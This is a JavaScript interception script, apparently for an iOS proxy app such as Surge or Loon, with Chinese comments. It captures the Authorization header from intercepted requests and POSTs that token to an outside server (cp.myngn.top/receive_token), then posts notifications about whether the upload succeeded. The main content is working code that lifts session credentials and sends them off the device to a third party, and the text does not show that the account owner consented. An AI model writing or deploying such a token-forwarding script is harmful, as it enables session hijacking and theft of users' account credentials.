// 处理拦截到的请求头
const myRequest = $request;

// 提取请求中的 Authorization 头
const authorizationToken = myRequest.headers["Authorization"];

// 判断是否存在 Authorization 头
if (authorizationToken) {
    // 准备上传的 URL 和数据
    const uploadUrl = "https://cp.myngn.top/receive_token";
    const uploadHeaders = {
        'Content-Type': 'application/json'
    };
    const uploadData = {
        'Authorization': authorizationToken
    };

    // 构建上传请求
    const uploadRequest = {
        url: uploadUrl,
        method: 'POST',
        headers: uploadHeaders,
        body: JSON.stringify(uploadData)
    };

    // 发送上传请求并处理结果
    $httpClient.post(uploadRequest, function (error, response, data) {
        if (error) {
            // 上传失败时处理
            $notification.post("Token 上传失败", "请求过程中发生错误", `${error}`);
        } else {
            const statusCode = response.status;
            // 成功上传后显示通知
            if (statusCode === 200) {
                try {
                    const responseData = JSON.parse(data);
                    const userId = responseData.userId || "未找到 userId";

                    // 在通知栏显示 userId
                    $notification.post("Token 上传成功", `UserId: ${userId}`, `服务器响应: ${data}`);
                } catch (error) {
                    $notification.post("Token 上传成功", "解析响应时出错", `服务器响应无法解析: ${data}`);
                }
            } else {
                $notification.post("Token 上传失败", `状态码: ${statusCode}`, `响应信息: ${data}`);
            }
        }
    });
} else {
    // 未找到 Authorization 头时的处理
    $notification.post("Token 上传失败", "未找到 Authorization 令牌", "请求头中不包含 Authorization 字段");
}

// 结束脚本
$done();
